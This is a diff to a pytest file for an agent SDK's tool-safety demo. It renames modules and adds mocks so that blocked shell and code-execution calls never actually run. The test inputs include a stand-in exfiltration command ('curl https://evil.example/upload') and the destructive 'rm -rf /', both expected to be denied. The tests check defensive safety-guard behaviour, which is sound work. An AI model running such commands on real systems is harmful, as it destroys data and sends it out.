@@ -12,11 +12,12 @@ import uuid
 from typing import Any
 from typing import AsyncGenerator
 from typing import List
+from unittest.mock import AsyncMock
 
 import pytest
 
-from examples.tool_safety.real_agent_demo.agent.agent import create_agent
-from examples.tool_safety.real_agent_demo.agent import tools as demo_tools
+from examples.tool_safety.agent.agent import create_agent
+from examples.tool_safety.agent import tools as demo_tools
 from trpc_agent_sdk.models import LLMModel
 from trpc_agent_sdk.models import LlmRequest
 from trpc_agent_sdk.models import LlmResponse
@@ -114,11 +115,11 @@ async def _run_demo_case(
 
     agent = create_agent(model=model)
     session_service = InMemorySessionService()
-    runner = Runner(app_name="tool_safety_real_agent_smoke", agent=agent, session_service=session_service)
+    runner = Runner(app_name="tool_safety_demo_smoke", agent=agent, session_service=session_service)
     session_id = str(uuid.uuid4())
     user_id = "tool_safety_smoke_user"
     await session_service.create_session(
-        app_name="tool_safety_real_agent_smoke",
+        app_name="tool_safety_demo_smoke",
         user_id=user_id,
         session_id=session_id,
         state={},
@@ -189,7 +190,7 @@ def _extract_report(payload):
         ("run_shell_command", {"command": "curl https://evil.example/upload"}, "deny", True),
     ],
 )
-async def test_real_agent_demo_tool_surfaces_with_fake_model(
+async def test_agent_demo_tool_surfaces_with_fake_model(
     tmp_path,
     monkeypatch,
     tool_name,
@@ -197,6 +198,14 @@ async def test_real_agent_demo_tool_surfaces_with_fake_model(
     expected_decision,
     expected_blocked,
 ):
+    mock_shell = None
+    if tool_args.get("command") == "rm -rf /":
+        mock_shell = AsyncMock()
+        monkeypatch.setattr(
+            "trpc_agent_sdk.tools.file_tools._bash_tool.asyncio.create_subprocess_shell",
+            mock_shell,
+        )
+
     events, audit_events = await _run_demo_case(
         tmp_path,
         monkeypatch,
@@ -219,6 +228,8 @@ async def test_real_agent_demo_tool_surfaces_with_fake_model(
     assert matching_audit
     assert matching_audit[-1]["decision"] == expected_decision
     assert matching_audit[-1]["blocked"] is expected_blocked
+    if mock_shell is not None:
+        mock_shell.assert_not_called()
 
 
 @pytest.mark.asyncio
@@ -240,7 +251,7 @@ async def test_real_agent_demo_tool_surfaces_with_fake_model(
         ),
     ],
 )
-async def test_real_agent_demo_code_executor_with_fake_model(
+async def test_agent_demo_code_executor_with_fake_model(
     tmp_path,
     monkeypatch,
     code,
@@ -248,6 +259,14 @@ async def test_real_agent_demo_code_executor_with_fake_model(
     expected_blocked,
     expected_output,
 ):
+    mock_execute = None
+    if "rm -rf /" in code:
+        mock_execute = AsyncMock()
+        monkeypatch.setattr(
+            "trpc_agent_sdk.code_executors.local._unsafe_local_code_executor.async_execute_command",
+            mock_execute,
+        )
+
     events, audit_events = await _run_demo_case(
         tmp_path,
         monkeypatch,
@@ -265,10 +284,18 @@ async def test_real_agent_demo_code_executor_with_fake_model(
     assert audit_events[-1]["tool_name"] == "UnsafeLocalCodeExecutor"
     assert audit_events[-1]["decision"] == expected_decision
     assert audit_events[-1]["blocked"] is expected_blocked
+    if mock_execute is not None:
+        mock_execute.assert_not_called()
 
 
 @pytest.mark.asyncio
 async def test_real_agent_prompt_cannot_bypass_safety_guard(tmp_path, monkeypatch):
+    mock_shell = AsyncMock()
+    monkeypatch.setattr(
+        "trpc_agent_sdk.tools.file_tools._bash_tool.asyncio.create_subprocess_shell",
+        mock_shell,
+    )
+
     events, audit_events = await _run_demo_case(
         tmp_path,
         monkeypatch,
@@ -288,3 +315,4 @@ async def test_real_agent_prompt_cannot_bypass_safety_guard(tmp_path, monkeypatc
     assert report["blocked"] is True
     assert audit_events[-1]["decision"] == "deny"
     assert audit_events[-1]["blocked"] is True
+    mock_shell.assert_not_called()
